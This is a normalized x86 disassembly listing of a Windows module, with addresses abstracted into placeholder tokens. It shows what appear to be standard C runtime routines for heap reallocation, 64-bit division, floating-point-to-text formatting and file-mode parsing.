cmp esi [ rw-data ]
ja r-xdata
mov eax edi
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
mov edi [ ebp - 0x1c ]
test esi esi
jne r-xdata
cmp [ ebp - 0x1c ] edi
jne r-xdata
push esi
push ebx
push eax
call sub_1002d6e1
add esp 0xc
test eax eax
je r-xdata
test edi edi
jne r-xdata
push esi
call sub_1002b638
pop ecx
test eax eax
je r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
jmp r-xdata
inc esi
cmp esi edi
jne r-xdata
push esi
call sub_1002d9c2
pop ecx
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
mov [ ebp - 0x1c ] ebx
jmp r-xdata
call sub_1002972b
call sub_1002972b
jmp r-xdata
test edi edi
jne r-xdata
push esi
call sub_1002b638
pop ecx
test eax eax
jne r-xdata
test edi edi
jne r-xdata
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push esi
push edi
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov [ ebp - 0x1c ] eax
cmp eax edi
je r-xdata
xor esi esi
inc esi
mov [ ebp + 0xc ] esi
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100296e9
pop ecx
mov [ esi ] eax
jmp r-xdata
call sub_1002972b
cmp [ ebp - 0x20 ] edi
je r-xdata
call sub_1002972b
cmp [ ebp - 0x20 ] edi
jne r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10026f10
push ebx
call sub_1002d1e3
mov [ ebp - 0x20 ] eax
push ebx
push eax
call sub_1002d213
add esp 0x18
mov eax esi
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_100296e9
mov [ esi ] eax
pop ecx
mov [ eax ] 0xc
jmp r-xdata
mov [ eax ] 0xc
push eax
push ebx
push [ ebp - 0x1c ]
call sub_10026f10
push ebx
push [ ebp - 0x20 ]
call sub_1002d213
add esp 0x14
mov eax esi
sub_100347d5
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
cmp ecx ebx
jbe r-xdata
imul ecx [ ebp + 0x10 ]
push esi
push edi
mov esi ecx
cmp [ ebp + 0x8 ] ebx
je r-xdata
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax [ ebp + 0x10 ]
jae r-xdata
push esi
push [ ebp + 0x8 ]
call sub_100345ba
mov edi eax
pop ecx
pop ecx
test edi edi
je r-xdata
push [ ebp + 0x8 ]
call sub_10031a4c
pop ecx
mov ebx eax
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0xc
call sub_1002480c
add esp 0x14
xor eax eax
jmp r-xdata
mov eax edi
pop edi
pop esi
cmp ebx esi
jae r-xdata
pop ebx
pop ebp
retn
sub esi ebx
push esi
push 0x0
add ebx edi
push ebx
call sub_10024b80
add esp 0xc
sub_10034850
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_100348f7
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
movzx eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xc8 ]
movzx eax [ ecx + eax * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10034942
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_1002b1c5
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_100278fe
test eax eax
movsx eax [ esi ]
push eax
call sub_1002b1c5
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
inc esi
inc esi
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_100349b5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_10027728
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_10034a37
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_10034a53
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_10037b55
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_10037aad
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_10034aaf
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_10024630
inc eax
push eax
push esi
add esi edi
push esi
call sub_1002b740
add esp 0x10
sub_10034af4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_10027728
xor esi esi
cmp ebx esi
jne r-xdata
cmp [ ebp + 0x8 ] esi
jbe r-xdata
call sub_1002972b
push 0x16
cmp [ ebp + 0xc ] esi
jle r-xdata
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x18 ] 0x0
je r-xdata
call sub_1002972b
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] esi
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_10034aaf
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
lea eax [ esi + 0x1 ]
mov cl [ eax ]
mov [ esi ] cl
mov esi eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] ebx
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
push r--data
push ebx
push esi
call sub_1002b660
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
inc esi
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
inc esi
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi ] 0x2d
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_1002b740
add esp 0xc
inc esi
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi ] al
mov eax edx
add [ esi + 0x1 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi ] al
mov eax edx
sub_10034c63
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10037d79
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
mov esi [ ebp + 0x14 ]
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
cmp esi ebx
setg cl
sub eax ecx
or eax 0xffffffff
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push ebx
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_10034af4
add esp 0x18
mov [ edi ] bl
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
cmp esi ebx
setg cl
add eax edi
add ecx eax
push ecx
call sub_10037bfd
add esp 0x10
cmp eax ebx
je r-xdata
sub_10034d33
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10034c63
add esp 0x18
pop ebp
retn
sub_10034d53
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_10027728
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_1002972b
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_1002972b
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
push edi
push edi
push edi
push edi
push edi
mov [ eax ] esi
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
mov [ esi ] 0x30
inc esi
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
mov ecx [ edi + 0x4 ]
inc esi
neg ebx
sbb ebx ebx
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi ] 0x31
inc esi
mov [ esi ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
inc esi
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_10034d33
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
mov [ esi ] 0x30
inc esi
cmp [ ebp + 0x18 ] 0x0
push 0x65
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi ] al
inc esi
push esi
call sub_10037a80
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10037ef0
add ax 0x30
movzx eax ax
cmp ax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_10037ef0
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_10024b80
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
inc esi
call sub_10037ef0
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi ] 0x2d
inc esi
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi ] 0x2b
inc esi
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_10037e10
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
cmp edx ebx
mov edi esi
mov [ esi ] 0x30
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_10037e10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_10037e10
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_100350c6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov ebx eax
mov esi [ ebx + 0x4 ]
mov edi ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_10027728
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_1002972b
push 0x16
pop esi
mov [ eax ] esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_1002480c
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebx ] 0x2d
mov esi edi
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebx + 0x4 ]
xor edi edi
inc edi
test eax eax
jg r-xdata
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
xor eax eax
cmp [ ebx ] 0x2d
sete al
add eax esi
add eax edi
mov [ eax ] 0x30
mov [ eax + 0x1 ] 0x0
add esi eax
mov eax esi
call sub_10034aaf
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
call sub_10034aaf
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov ebx [ ebx + 0x4 ]
inc esi
test ebx ebx
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg ebx
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] ebx
cmp [ ebp + 0xc ] ebx
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax esi
call sub_10034aaf
push edi
push 0x30
push esi
call sub_10024b80
add esp 0xc
sub_100351bd
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10037d79
xor ebx ebx
add esp 0x14
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp eax ebx
jbe r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_1002480c
add esp 0x14
mov eax esi
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push ebx
push esi
push [ ebp + 0x10 ]
mov ecx edi
call sub_100350c6
add esp 0x10
mov [ edi ] bl
jmp r-xdata
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_10037bfd
add esp 0x10
cmp eax ebx
je r-xdata
sub_10035278
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_10037d79
xor ebx ebx
add esp 0x14
cmp esi ebx
jne r-xdata
mov ecx [ ebp + 0x10 ]
cmp ecx ebx
jbe r-xdata
call sub_1002972b
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] edi
call sub_1002480c
add esp 0x14
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x30 ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] bl
jmp r-xdata
lea eax [ ebp - 0x30 ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_10037bfd
add esp 0x10
cmp eax ebx
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10034af4
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
cmp cl bl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
call sub_100350c6
add esp 0x10
jmp r-xdata
mov al [ edi ]
inc edi
test al al
jne r-xdata
mov [ edi - 0x2 ] bl
sub_10035372
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
cmp eax 0x65
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10034c63
cmp eax 0x45
je r-xdata
cmp eax 0x66
jne r-xdata
cmp eax 0x61
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100351bd
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10034d53
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10035278
jmp r-xdata
sub_100353fa
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10035372
add esp 0x1c
pop ebp
retn
sub_1003541d
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_10037f0f
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
sub_10035486
push r--data
call [ GetModuleHandleA@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
fld [ r--data ]
fstp [ ebp - 0x10 ]
fld [ r--data ]
fstp [ ebp - 0x18 ]
fld [ ebp - 0x18 ]
fdiv [ ebp - 0x10 ]
fmul [ ebp - 0x10 ]
fsubr [ ebp - 0x18 ]
fstp [ ebp - 0x8 ]
fld1
fcomp [ ebp - 0x8 ]
fnstsw ax
test ah 0x5
jpe r-xdata
push 0x0
call eax
retn
xor eax eax
leave
retn
xor eax eax
inc eax
leave
retn
sub_100354b0
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x1c ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_10038a03
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_10037f7b
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_10035557
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] edi
mov [ ebp - 0x10 ] edi
jmp r-xdata
cmp [ esi ] 0x20
je r-xdata
inc esi
inc esi
movzx eax [ esi ]
cmp eax 0x61
je r-xdata
mov ebx 0x109
cmp eax 0x72
je r-xdata
cmp [ esi ] 0x20
je r-xdata
mov edx 0x4000
xor ebx ebx
or [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp eax 0x77
je r-xdata
inc esi
inc esi
